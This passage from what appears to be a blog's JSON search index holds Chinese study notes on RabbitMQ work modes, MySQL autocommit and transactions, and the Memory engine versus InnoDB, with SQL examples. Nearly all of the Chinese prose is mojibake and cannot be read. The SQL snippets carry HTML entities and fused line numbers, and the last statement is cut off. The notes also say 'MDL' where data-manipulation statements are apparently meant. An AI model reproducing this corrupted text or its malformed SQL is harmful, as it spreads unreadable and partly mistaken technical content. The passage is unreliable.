é™¤æ‰å·²ç»å­˜åœ¨çš„é˜Ÿåˆ—ã€‚ å› ä¸º RabbitMQ æœ‰å¤šç§å·¥ä½œæ–¹å¼ï¼Œåœ¨ä¸åŒå·¥ä½œæ¨¡å¼ä¸‹ï¼Œæ¶ˆæ¯æŠ•é€’åˆ°é˜Ÿåˆ—çš„æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„ã€‚ ç®€å•æ¨¡å¼ï¼šä¸éœ€è¦äº¤æ¢æœºï¼Œç›´æ¥æŠ•é€’åˆ°é˜Ÿåˆ— è·¯ç”±æ¨¡å¼ï¼šéœ€è¦äº¤æ¢æœºã€éœ€è¦ Routing Keyï¼Œé€šè¿‡å°† Routing ä¸ Queue è¿›è¡Œç»‘å®šï¼Œæ¶ˆæ¯æ‰èƒ½é€šè¿‡äº¤æ¢æœºåˆ°æ­£ç¡®çš„è·¯ç”±ä¸Š å‚è€ƒé“¾æ¥ RabbitMQ å¸¸è§çš„å·¥ä½œæ¨¡å¼","categories":[{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/categories/MQ/"}],"tags":[{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/tags/MQ/"},{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"https://www.0x2beace.com/tags/RabbitMQ/"}]},{"title":"Mysql ä¸“æ å­¦ä¹ ç¬”è®°","slug":"mysql-column-study-notes","date":"2022-09-05T14:46:39.000Z","updated":"2023-02-18T03:28:33.605Z","comments":true,"path":"mysql-column-study-notes/","link":"","permalink":"https://www.0x2beace.com/mysql-column-study-notes/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼ŒæŒç»­æ›´æ–°ã€‚","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼ŒæŒç»­æ›´æ–°ã€‚ å…³äºäº‹åŠ¡èµ·åˆä¼šç–‘æƒ‘ï¼Œäº‹åŠ¡æ˜¯å¯ä»¥å•ç‹¬å¼€å¯ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ begin/start transaction è¿™ç±»å‘½ä»¤ï¼Œæ˜¾å¼çš„å¼€å¯äº‹åŠ¡ã€‚ é‚£æˆ‘å•ç‹¬çš„æ‰§è¡Œä¸€ä¸ª update è¯­å¥æ—¶ï¼Œæ˜¯ä¸æ˜¯å°±è¡¨ç¤ºæ²¡æœ‰å¼€å¯äº‹åŠ¡ï¼Ÿ å¹¶ä¸æ˜¯çš„ï¼Œåœ¨ Mysql ä¸­ï¼Œæœ‰ä¸€ä¸ª autocommit çš„å‚æ•°ï¼Œå®ƒè¡¨ç¤ºæ˜¯å¦è‡ªåŠ¨å¯ç”¨äº‹åŠ¡ï¼Œé»˜è®¤æ˜¯å¯ç”¨çš„ï¼Œ å½“æˆ‘ä»¬æ²¡æœ‰æ˜¾å¼åœ°ä½¿ç”¨ begin/start transaction æ—¶ï¼Œç›´æ¥æ‰§è¡Œä¸€ä¸ª update è¯­å¥ï¼Œè¡¨ç¤ºè¿™ä¸ª update è¯­å¥æœ¬èº«å°±æ˜¯ä¸€ä¸ªäº‹åŠ¡ï¼Œè¯­å¥å®Œæˆçš„æ—¶å€™ä¼šè‡ªåŠ¨æäº¤ã€‚ ä½ å¯èƒ½ä¼šé—®ï¼Œæ—¢ç„¶æœ‰äº†è¿™ä¸ªè‡ªåŠ¨å¯ç”¨äº‹åŠ¡ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜éœ€è¦æ‰‹åŠ¨æ¥å¯ç”¨äº‹åŠ¡å‘¢ï¼Ÿ è¿™æ˜¯å› ä¸ºä¸ºäº†ä¿è¯åŸå­æ€§ï¼Œå¼€å‘æ—¶ï¼Œå¸¸å¸¸ä¼šé‡åˆ°æŸä¸ªé€»è¾‘é‡Œé¢å¯èƒ½å«æœ‰å¤šä¸ª MDL æ“ä½œï¼Œæˆ‘ä»¬å¯èƒ½å¸Œæœ›ï¼Œè¿™äº›æ“ä½œè¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œå°±ä¼šé€‰æ‹©æ‰‹åŠ¨å¼€å¯äº‹åŠ¡ï¼Œå°†è¿™äº›æ“ä½œæ”¾åœ¨ä¸€ä¸ªäº‹åŠ¡é‡Œé¢ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬åœ¨æ‰§è¡Œçš„ä»»ä½•ä¸€ä¸ª MDL è¯­å¥ï¼Œéƒ½æ˜¯å¸¦æœ‰äº‹åŠ¡çš„ï¼Œåªæ˜¯ï¼Œè¿™ç±»äº‹åŠ¡é€šå¸¸æ˜¯è‡ªåŠ¨å¯ç”¨/æäº¤çš„ï¼Œå¯¹äºå®¢æˆ·ç«¯çš„ä½¿ç”¨è€…æ¥è¯´ï¼Œå…¶è¿‡ç¨‹æ˜¯æ— æ„ŸçŸ¥çš„ã€‚ å¦å¤–è¿˜æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š begin/start transaction å‘½ä»¤å¹¶ä¸æ˜¯ä¸€ä¸ªäº‹åŠ¡çš„èµ·ç‚¹ï¼Œåœ¨æ‰§è¡Œåˆ°å®ƒä»¬ä¹‹åçš„ç¬¬ä¸€ä¸ªæ“ä½œ InnoDB è¡¨çš„è¯­å¥ï¼Œäº‹åŠ¡æ‰çœŸæ­£å¯åŠ¨ã€‚ å¦‚æœæƒ³è¦é©¬ä¸Šå¯åŠ¨ä¸€ä¸ªäº‹åŠ¡ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ start transaction with consistent snapshot å…³äºæ­»é”å…¶å®å¯¹äºå°å…¬å¸çš„ä¸šåŠ¡è€Œè¨€ï¼Œæ•°æ®åº“ä¸å¤ªå®¹æ˜“å‘ç”Ÿæ­»é”çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æ²¡æœ‰å¼€å¯äº†ä½†æœªé‡Šæ”¾çš„äº‹åŠ¡ï¼Œæˆ–è€…é•¿äº‹åŠ¡æœªæäº¤ä»¥åŠæ…¢æŸ¥è¯¢è¿™äº›ï¼ŒåŸºæœ¬ä¸Šä¸ä¼šå‡ºç°æ­»é”çš„é—®é¢˜ã€‚ ï¼ˆä¸€ä¸ªæ…¢æŸ¥è¯¢ä¼šå¯¼è‡´è¡¨é”ï¼Œæ­¤æ—¶å¯¹è¿™å¼ è¡¨è¿›è¡Œå¢åˆ æ”¹æŸ¥éƒ½ä¼šè¢«é”ä½ã€‚ï¼‰ toC åœºæ™¯çš„ç³»ç»Ÿå¤§å¤šè¦é¢å¯¹è¾ƒé«˜çš„ QPSï¼Œå³ä½¿æ˜¯å°å‹/ä¸­å‹å…¬å¸ä½¿ç”¨ MySQLï¼Œæ²¡æœ‰é‚£ä¹ˆé«˜çš„æŸ¥è¯¢é‡ï¼Œå•è¡¨æ•°æ®åœ¨ç™¾ä¸‡é‡çº§ä¹Ÿå±å¸¸è§ã€‚ å¯¹äºå°å…¬å¸æ¥è¯´ï¼ŒDB åŒæ—¶åˆæ˜¯éå¸¸è„†å¼±çš„ä¸€ç¯ï¼Œå› ä¸ºåªè¦ä¸€ä¸ªå·¥ç¨‹å¸ˆä¸æ…å°†ä¸å¸¦ç´¢å¼•çš„æŸ¥è¯¢ä»£ç å¸¦ä¸Šçº¿ï¼Œå°±ä¼šå¯¼è‡´çº¿ä¸Šäº‹æ•…ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"38 éƒ½è¯´InnoDBå¥½ï¼Œé‚£è¿˜è¦ä¸è¦ä½¿ç”¨Memoryå¼•æ“","slug":"it-is-said-that-innodb-is-good-so-do-you-want-to-use-the-memory-engine","date":"2022-09-01T01:02:23.000Z","updated":"2023-02-18T03:28:33.603Z","comments":true,"path":"it-is-said-that-innodb-is-good-so-do-you-want-to-use-the-memory-engine/","link":"","permalink":"https://www.0x2beace.com/it-is-said-that-innodb-is-good-so-do-you-want-to-use-the-memory-engine/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ InnoDB ä¸ Memory å¼•æ“çš„åŒºåˆ« äº†è§£ Memory å¼•æ“çš„ä¼˜ç¼ºç‚¹","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ InnoDB ä¸ Memory å¼•æ“çš„åŒºåˆ« äº†è§£ Memory å¼•æ“çš„ä¼˜ç¼ºç‚¹ å†…å­˜è¡¨çš„æ•°æ®ç»„ç»‡ç»“æ„ä¸ºäº†ä¾¿äºåˆ†æï¼Œæˆ‘æ¥æŠŠè¿™ä¸ªé—®é¢˜ç®€åŒ–ä¸€ä¸‹ï¼Œå‡è®¾æœ‰ä»¥ä¸‹çš„ä¸¤å¼ è¡¨ t1 å’Œ t2ï¼Œå…¶ä¸­è¡¨ t1 ä½¿ç”¨ Memory å¼•æ“ï¼Œ è¡¨ t2 ä½¿ç”¨ InnoDB å¼•æ“ã€‚ 1234create table t1(id int primary key, c int) engine&#x3D;Memory;create table t2(id int primary key, c int) engine&#x3D;innodb;insert into t1 values(1,1),(2,2),(3,3),(4,4),(5,5),(6,6),(7,7),(8,8),(9,9),(0,0);insert into t2 values(1,1),(2,2),(3,3),(4,4),(5,5),(6,6),(7,7),(8,8),(9,9),(0,0); ç„¶åï¼Œåˆ†åˆ«æ‰§è¡Œ select * from t1 å’Œ select * from t2 å¯ä»¥çœ‹åˆ°ï¼Œå†…å­˜è¡¨ t1 çš„è¿”å›ç»“æœé‡Œé¢ 0 åœ¨æœ€åä¸€è¡Œï¼Œè€Œ InnoDB è¡¨ t2 çš„è¿”å›ç»“æœé‡Œ 0 åœ¨ç¬¬ä¸€è¡Œã€‚ å‡ºç°è¿™ä¸ªåŒºåˆ«çš„åŸå› ï¼Œè¦ä»è¿™ä¸¤ä¸ªå¼•æ“çš„ä¸»é”®ç´¢å¼•çš„ç»„ç»‡æ–¹å¼è¯´èµ·ã€‚ è¡¨ t2 ç”¨çš„æ˜¯ InnoDB å¼•æ“ï¼Œå®ƒçš„ä¸»é”®ç´¢å¼• id çš„ç»„ç»‡æ–¹å¼ï¼Œä½ å·²ç»å¾ˆç†Ÿæ‚‰äº†ï¼šInnoDB è¡¨çš„æ•°æ®å°±æ”¾åœ¨ä¸»é”®ç´¢å¼•æ ‘ä¸Šï¼Œä¸»é”®ç´¢å¼•æ˜¯ B+ æ ‘ã€‚æ‰€ä»¥è¡¨ t2 çš„æ•°æ®ç»„ç»‡æ–¹å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä¸»é”®ç´¢å¼•ä¸Šçš„å€¼æ˜¯æœ‰åºå­˜å‚¨çš„ã€‚åœ¨æ‰§è¡Œ select * çš„æ—¶å€™ï¼Œå°±ä¼šæŒ‰ç…§å¶å­èŠ‚ç‚¹ä»å·¦åˆ°å³æ‰«æï¼Œæ‰€ä»¥å¾—åˆ°çš„ç»“æœé‡Œï¼Œ0 å°±å‡ºç°åœ¨ç¬¬ä¸€è¡Œã€‚ ä¸ InnoDB å¼•æ“ä¸åŒï¼ŒMemory å¼•æ“çš„æ•°æ®å’Œç´¢å¼•æ˜¯åˆ†å¼€çš„ã€‚å†æ¥çœ‹ä¸€ä¸‹è¡¨ t1 ä¸­çš„æ•°æ®å†…å®¹ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œå†…å­˜è¡¨çš„æ•°æ®éƒ¨åˆ†ä»¥æ•°ç»„çš„æ–¹å¼å•ç‹¬å­˜æ”¾ï¼Œè€Œä¸»é”® id ç´¢å¼•é‡Œï¼Œå­˜çš„æ˜¯æ¯ä¸ªæ•°æ®çš„ä½ç½®ã€‚ä¸»é”® id æ˜¯ hash ç´¢å¼•ï¼Œå¯ä»¥çœ‹åˆ°ç´¢å¼•ä¸Šçš„ key å¹¶ä¸æ˜¯æœ‰åºçš„ã€‚ åœ¨å†…å­˜è¡¨ t1 ä¸­ï¼Œå½“æˆ‘æ‰§è¡Œ select * çš„æ—¶å€™ï¼Œèµ°çš„æ˜¯å…¨è¡¨æ‰«æï¼Œä¹Ÿå°±æ˜¯é¡ºåºæ‰«æè¿™ä¸ªæ•°ç»„ã€‚å› æ­¤ï¼Œ0 å°±æ˜¯æœ€åä¸€ä¸ªè¢«è¯»åˆ°ï¼Œå¹¶æ”¾å…¥ç»“æœé›†çš„æ•°æ®ã€‚ å¯è§ï¼ŒInnoDB å’Œ Memory å¼•æ“çš„æ•°æ®ç»„ç»‡æ–¹å¼æ˜¯ä¸åŒçš„ï¼š InnoDB å¼•æ“æŠŠæ•°æ®æ”¾åœ¨ä¸»é”®ç´¢å¼•ä¸Šï¼Œå…¶ä»–ç´¢å¼•ä¸Šä¿å­˜çš„æ˜¯ä¸»é”® idã€‚è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºç´¢å¼•ç»„ç»‡è¡¨ï¼ˆIndex Organizied Tableï¼‰ã€‚ è€Œ Memory å¼•æ“é‡‡ç”¨çš„æ˜¯æŠŠæ•°æ®å•ç‹¬å­˜æ”¾ï¼Œç´¢å¼•ä¸Šä¿å­˜æ•°æ®ä½ç½®çš„æ•°æ®ç»„ç»‡å½¢å¼ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºå †ç»„ç»‡è¡¨ï¼ˆHeap Organizied Tableï¼‰ã€‚ ä»ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸¤ä¸ªå¼•æ“çš„ä¸€äº›å…¸å‹ä¸åŒï¼š InnoDB è¡¨çš„æ•°æ®æ€»æ˜¯æœ‰åºå­˜æ”¾çš„ï¼Œè€Œå†…å­˜è¡¨çš„æ•°æ®å°±æ˜¯æŒ‰ç…§å†™å…¥é¡ºåºå­˜æ”¾çš„ï¼› å½“æ•°æ®æ–‡ä»¶æœ‰ç©ºæ´çš„æ—¶å€™ï¼ŒInnoDB è¡¨åœ¨æ’å…¥æ–°æ•°æ®çš„æ—¶å€™ï¼Œä¸ºäº†ä¿è¯æ•°æ®æœ‰åºæ€§ï¼Œåªèƒ½åœ¨å›ºå®šçš„ä½ç½®å†™å…¥æ–°å€¼ï¼Œè€Œå†…å­˜è¡¨æ‰¾åˆ°ç©ºä½å°±å¯ä»¥æ’å…¥æ–°å€¼ï¼› æ•°æ®ä½ç½®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼ŒInnoDB è¡¨åªéœ€è¦ä¿®æ”¹ä¸»é”®ç´¢å¼•ï¼Œè€Œå†…å­˜è¡¨éœ€è¦ä¿®æ”¹æ‰€æœ‰ç´¢å¼•ï¼› InnoDB è¡¨ç”¨ä¸»é”®ç´¢å¼•æŸ¥è¯¢æ—¶éœ€è¦èµ°ä¸€æ¬¡ç´¢å¼•æŸ¥æ‰¾ï¼Œç”¨æ™®é€šç´¢å¼•æŸ¥è¯¢çš„æ—¶å€™ï¼Œéœ€è¦èµ°ä¸¤æ¬¡ç´¢å¼•æŸ¥æ‰¾ã€‚è€Œå†…å­˜è¡¨æ²¡æœ‰è¿™ä¸ªåŒºåˆ«ï¼Œæ‰€æœ‰ç´¢å¼•çš„â€œåœ°ä½â€éƒ½æ˜¯ç›¸åŒçš„ã€‚ InnoDB æ”¯æŒå˜é•¿æ•°æ®ç±»å‹ï¼Œä¸åŒè®°å½•çš„é•¿åº¦å¯èƒ½ä¸åŒï¼›å†…å­˜è¡¨ä¸æ”¯æŒ Blob å’Œ Text å­—æ®µï¼Œå¹¶ä¸”å³ä½¿å®šä¹‰äº† varchar(N)ï¼Œå®é™…ä¹Ÿå½“ä½œ char(N)ï¼Œä¹Ÿå°±æ˜¯å›ºå®šé•¿åº¦å­—ç¬¦ä¸²æ¥å­˜å‚¨ï¼Œå› æ­¤å†…å­˜è¡¨çš„æ¯è¡Œæ•°æ®é•¿åº¦ç›¸åŒã€‚ ç”±äºå†…å­˜è¡¨çš„è¿™äº›ç‰¹æ€§ï¼Œæ¯ä¸ªæ•°æ®è¡Œè¢«åˆ é™¤ä»¥åï¼Œç©ºå‡ºçš„è¿™ä¸ªä½ç½®éƒ½å¯ä»¥è¢«æ¥ä¸‹æ¥è¦æ’å…¥çš„æ•°æ®å¤ç”¨ã€‚æ¯”å¦‚ï¼Œå¦‚æœè¦åœ¨è¡¨ t1 ä¸­æ‰§è¡Œï¼š 123delete from t1 where id&#x3D;5;insert into t1 values(10,10);select * from t1; å°±ä¼šçœ‹åˆ°è¿”å›ç»“æœé‡Œï¼Œid=10 è¿™ä¸€è¡Œå‡ºç°åœ¨ id=4 ä¹‹åï¼Œä¹Ÿå°±æ˜¯åŸæ¥ id=5 è¿™è¡Œæ•°æ®çš„ä½ç½®ã€‚ éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œè¡¨ t1 çš„è¿™ä¸ªä¸»é”®ç´¢å¼•æ˜¯å“ˆå¸Œç´¢å¼•ï¼Œå› æ­¤å¦‚æœæ‰§è¡ŒèŒƒå›´æŸ¥è¯¢ï¼Œæ¯”å¦‚ï¼š 1select * from t1 where id&lt;5; æ˜¯ç”¨ä¸ä¸Šä¸»é”®ç´¢å¼•çš„ï¼Œéœ€è¦èµ°å…¨è¡¨æ‰«æã€‚ä½ å¯ä»¥å€Ÿæ­¤å†å›é¡¾ä¸‹ç¬¬ 4 ç¯‡æ–‡ç« çš„å†…å®¹ã€‚é‚£å¦‚æœè¦è®©å†…å­˜è¡¨æ”¯æŒèŒƒå›´æ‰«æï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ ï¼Ÿ hash ç´¢å¼•å’Œ B-Tree ç´¢å¼•å®é™…ä¸Šï¼Œå†…å­˜è¡¨ä¹Ÿæ˜¯æ”¯ B-Tree ç´¢å¼•çš„ã€‚åœ¨ id åˆ—ä¸Šåˆ›å»ºä¸€ä¸ª B-Tree ç´¢å¼•ï¼ŒSQL è¯­å¥å¯ä»¥è¿™ä¹ˆå†™ï¼š 1alter table t1 add index a_btree_index using btree (id); è¿™æ—¶ï¼Œè¡¨ t1 çš„æ•°æ®ç»„ç»‡å½¢å¼å°±å˜æˆäº†è¿™æ ·ï¼š æ–°å¢çš„è¿™ä¸ª B-Tree ç´¢å¼•ä½ çœ‹ç€å°±çœ¼ç†Ÿäº†ï¼Œè¿™è·Ÿ InnoDB çš„ b+ æ ‘ç´¢å¼•ç»„ç»‡å½¢å¼ç±»ä¼¼ã€‚ ä½œä¸ºå¯¹æ¯”ï¼Œä½ å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸‹é¢è¿™ä¸¤ä¸ªè¯­å¥çš„è¾“å‡ºï¼š å¯ä»¥çœ‹åˆ°ï¼Œæ‰§è¡Œ select * from t1 where id&lt;5 çš„æ—¶å€™ï¼Œä¼˜åŒ–å™¨ä¼šé€‰æ‹© B-Tree ç´¢å¼•ï¼Œæ‰€ä»¥è¿”å›ç»“æœæ˜¯ 0 åˆ° 4ã€‚ ä½¿ç”¨ force index å¼ºè¡Œä½¿ç”¨ä¸»é”® id è¿™ä¸ªç´¢å¼•ï¼Œid=0 è¿™ä¸€è¡Œå°±åœ¨ç»“æœé›†çš„æœ€æœ«å°¾äº†ã€‚ å…¶å®ï¼Œä¸€èˆ¬åœ¨æˆ‘ä»¬çš„å°è±¡ä¸­ï¼Œå†…å­˜è¡¨çš„ä¼˜åŠ¿æ˜¯é€Ÿåº¦å¿«ï¼Œå…¶ä¸­çš„ä¸€ä¸ªåŸå› å°±æ˜¯ Memory å¼•æ“æ”¯æŒ hash ç´¢å¼•ã€‚å½“ç„¶ï¼Œæ›´é‡è¦çš„åŸå› æ˜¯ï¼Œå†…å­˜è¡¨çš„æ‰€æœ‰æ•°æ®éƒ½ä¿å­˜åœ¨å†…å­˜ï¼Œè€Œå†…å­˜çš„è¯»å†™é€Ÿåº¦æ€»æ˜¯æ¯”ç£ç›˜å¿«ã€‚ ä½†æ˜¯ï¼Œæ¥ä¸‹æ¥æˆ‘è¦è·Ÿä½ è¯´æ˜ï¼Œä¸ºä»€ä¹ˆæˆ‘ä¸å»ºè®®ä½ åœ¨ç”Ÿäº§ç¯å¢ƒä¸Šä½¿ç”¨å†…å­˜è¡¨ã€‚è¿™é‡Œçš„åŸå› ä¸»è¦åŒ…æ‹¬ä¸¤ä¸ªæ–¹é¢ï¼š é”ç²’åº¦é—®é¢˜ï¼› æ•°æ®æŒä¹…åŒ–é—®é¢˜ã€‚ å†…å­˜è¡¨çš„é”æˆ‘ä»¬å…ˆæ¥è¯´è¯´å†…å­˜è¡¨çš„é”ç²’åº¦é—®é¢˜ã€‚ å†…å­˜è¡¨ä¸æ”¯æŒè¡Œé”ï¼Œåªæ”¯æŒè¡¨é”ã€‚å› æ­¤ï¼Œä¸€å¼ è¡¨åªè¦æœ‰æ›´æ–°ï¼Œå°±ä¼šå µä½å…¶ä»–æ‰€æœ‰åœ¨è¿™ä¸ªè¡¨ä¸Šçš„è¯»å†™æ“ä½œã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„è¡¨é”è·Ÿä¹‹å‰æˆ‘ä»¬ä»‹ç»è¿‡çš„ MDL é”ä¸åŒï¼Œä½†éƒ½æ˜¯è¡¨çº§çš„é”ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘é€šè¿‡ä¸‹é¢è¿™ä¸ªåœºæ™¯ï¼Œè·Ÿä½ æ¨¡æ‹Ÿä¸€ä¸‹å†…å­˜è¡¨çš„è¡¨çº§é”ã€‚ åœ¨è¿™ä¸ªæ‰§è¡Œåºåˆ—é‡Œï¼Œsession A çš„ update è¯­å¥è¦æ‰§è¡Œ 50 ç§’ï¼Œåœ¨è¿™ä¸ªè¯­å¥æ‰§è¡ŒæœŸé—´ session B çš„æŸ¥è¯¢ä¼šè¿›å…¥é”ç­‰å¾…çŠ¶æ€ã€‚session C çš„ show processlist ç»“æœè¾“å‡ºå¦‚ä¸‹ï¼š è·Ÿè¡Œé”æ¯”èµ·æ¥ï¼Œè¡¨é”å¯¹å¹¶å‘è®¿é—®çš„æ”¯æŒä¸å¤Ÿå¥½ã€‚æ‰€ä»¥ï¼Œå†…å­˜è¡¨çš„é”ç²’åº¦é—®é¢˜ï¼Œå†³å®šäº†å®ƒåœ¨å¤„ç†å¹¶å‘äº‹åŠ¡çš„æ—¶å€™ï¼Œæ€§èƒ½ä¹Ÿä¸ä¼šå¤ªå¥½ã€‚ æ•°æ®æŒä¹…æ€§é—®é¢˜æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å†çœ‹çœ‹æ•°æ®æŒä¹…æ€§çš„é—®é¢˜ã€‚ æ•°æ®æ”¾åœ¨å†…å­˜ä¸­ï¼Œæ˜¯å†…å­˜è¡¨çš„ä¼˜åŠ¿ï¼Œä½†ä¹Ÿæ˜¯ä¸€ä¸ªåŠ£åŠ¿ã€‚å› ä¸ºï¼Œæ•°æ®åº“é‡å¯çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„å†…å­˜è¡¨éƒ½ä¼šè¢«æ¸…ç©ºã€‚ å†…å­˜è¡¨å¹¶ä¸é€‚åˆåœ¨ç”Ÿäº§ç¯å¢ƒä¸Šä½œä¸ºæ™®é€šæ•°æ®è¡¨ä½¿ç”¨ã€‚ æœ‰åŒå­¦ä¼šè¯´ï¼Œä½†æ˜¯å†…å­˜è¡¨æ‰§è¡Œé€Ÿåº¦å¿«å‘€ã€‚è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®ä½ å¯ä»¥è¿™ä¹ˆåˆ†æï¼š å¦‚æœä½ çš„è¡¨æ›´æ–°é‡å¤§ï¼Œé‚£ä¹ˆå¹¶å‘åº¦æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„å‚è€ƒæŒ‡æ ‡ï¼ŒInnoDB æ”¯æŒè¡Œé”ï¼Œå¹¶å‘åº¦æ¯”å†…å­˜è¡¨å¥½ï¼› èƒ½æ”¾åˆ°å†…å­˜è¡¨çš„æ•°æ®é‡éƒ½ä¸å¤§ã€‚å¦‚æœä½ è€ƒè™‘çš„æ˜¯è¯»çš„æ€§èƒ½ï¼Œä¸€ä¸ªè¯» QPS å¾ˆé«˜å¹¶ä¸”æ•°æ®é‡ä¸å¤§çš„è¡¨ï¼Œå³ä½¿æ˜¯ä½¿ç”¨ InnoDBï¼Œæ•°æ®ä¹Ÿæ˜¯éƒ½ä¼šç¼“å­˜åœ¨ InnoDB Buffer Pool é‡Œçš„ã€‚å› æ­¤ï¼Œä½¿ç”¨ InnoDB è¡¨çš„è¯»æ€§èƒ½ä¹Ÿä¸ä¼šå·®ã€‚ æ‰€ä»¥ï¼Œå»ºè®®æŠŠæ™®é€šå†…å­˜è¡¨éƒ½ç”¨ InnoDB è¡¨æ¥ä»£æ›¿ã€‚ä½†æ˜¯ï¼Œæœ‰ä¸€ä¸ªåœºæ™¯å´æ˜¯ä¾‹å¤–çš„ã€‚ è¿™ä¸ªåœºæ™¯å°±æ˜¯ï¼Œæˆ‘ä»¬åœ¨ç¬¬ 35 å’Œ 36 ç¯‡è¯´åˆ°çš„ç”¨æˆ·ä¸´æ—¶è¡¨ã€‚åœ¨æ•°æ®é‡å¯æ§ï¼Œä¸ä¼šè€—è´¹è¿‡å¤šå†…å­˜çš„æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥è€ƒè™‘ä½¿ç”¨å†…å­˜è¡¨ã€‚ å†…å­˜ä¸´æ—¶è¡¨åˆšå¥½å¯ä»¥æ— è§†å†…å­˜è¡¨çš„ä¸¤ä¸ªä¸è¶³ï¼Œä¸»è¦æ˜¯ä¸‹é¢çš„ä¸‰ä¸ªåŸå› ï¼š ä¸´æ—¶è¡¨ä¸ä¼šè¢«å…¶ä»–çº¿ç¨‹è®¿é—®ï¼Œæ²¡æœ‰å¹¶å‘æ€§çš„é—®é¢˜ï¼› ä¸´æ—¶è¡¨é‡å¯åä¹Ÿæ˜¯éœ€è¦åˆ é™¤çš„ï¼Œæ¸…ç©ºæ•°æ®è¿™ä¸ªé—®é¢˜ä¸å­˜åœ¨ï¼› å¤‡åº“çš„ä¸´æ—¶è¡¨ä¹Ÿä¸ä¼šå½±å“ä¸»åº“çš„ç”¨æˆ·çº¿ç¨‹ã€‚ ç°åœ¨ï¼Œæˆ‘ä»¬å›è¿‡å¤´å†çœ‹ä¸€ä¸‹ç¬¬ 35 ç¯‡ join è¯­å¥ä¼˜åŒ–çš„ä¾‹å­ï¼Œå½“æ—¶æˆ‘å»ºè®®çš„æ˜¯åˆ›å»ºä¸€ä¸ª InnoDB ä¸´æ—¶è¡¨ï¼Œä½¿ç”¨çš„è¯­å¥åºåˆ—æ˜¯ï¼š 123create temporary table temp_t(id int primary key, a int, b int, index(b))engine&#x3D;innodb;insert into temp_t select * from t2 where b&gt;&#x3D;1 and b&lt;&#x3D;2000;select * from t1 join temp_t on (t1.b&#x3D;temp_t.b); äº†è§£äº†å†…å­˜è¡¨çš„ç‰¹æ€§ï¼Œä½ å°±çŸ¥é“äº†ï¼Œ å…¶å®è¿™é‡Œä½¿ç”¨å†…å­˜ä¸´æ—¶è¡¨çš„æ•ˆæœæ›´å¥½ï¼ŒåŸå› æœ‰ä¸‰ä¸ªï¼š ç›¸æ¯”äº InnoDB è¡¨ï¼Œä½¿ç”¨å†…å­˜è¡¨ä¸éœ€è¦å†™ç£ç›˜ï¼Œå¾€è¡¨ temp_t çš„å†™æ•°æ®çš„é€Ÿåº¦æ›´å¿«ï¼› ç´¢å¼• b ä½¿ç”¨ hash ç´¢å¼•ï¼ŒæŸ¥æ‰¾çš„é€Ÿåº¦æ¯” B-Tree ç´¢å¼•å¿«ï¼› ä¸´æ—¶è¡¨æ•°æ®åªæœ‰ 2000 è¡Œï¼Œå ç”¨çš„å†…å­˜æœ‰é™ã€‚ å› æ­¤ï¼Œä½ å¯ä»¥å¯¹ç¬¬ 35 ç¯‡æ–‡ç« çš„è¯­å¥åºåˆ—åšä¸€ä¸ªæ”¹å†™ï¼Œå°†ä¸´æ—¶è¡¨ t1 æ”¹æˆå†…å­˜ä¸´æ—¶è¡¨ï¼Œå¹¶ä¸”åœ¨å­—æ®µ b ä¸Šåˆ›å»ºä¸€ä¸ª hash ç´¢å¼•ã€‚ 123create temporary table temp_t(id int primary key, a int, b int, index (b))engine&#x3D;memory;insert into temp_t select * from t2 where b&gt;&#x3D;1 and b&lt;&#x3D;2000;select * from t1 join temp_t on 